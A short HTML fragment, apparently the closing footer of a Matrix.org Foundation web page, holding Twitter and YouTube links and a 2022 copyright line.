            <a href="https:&#x2F;&#x2F;twitter.com&#x2F;matrixdotorg"><img src="/assets/twitter.svg" alt="Twitter"></a>
            
            <a href="https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UCVFkW-chclhuyYRbmmfwt6w"><img src="/assets/youtube.svg" alt="YouTube"></a>
            
        </div>
    </div>
    <p>¬© 2022 The Matrix.org Foundation C.I.C.</p>
</footer>

</body>

</html>
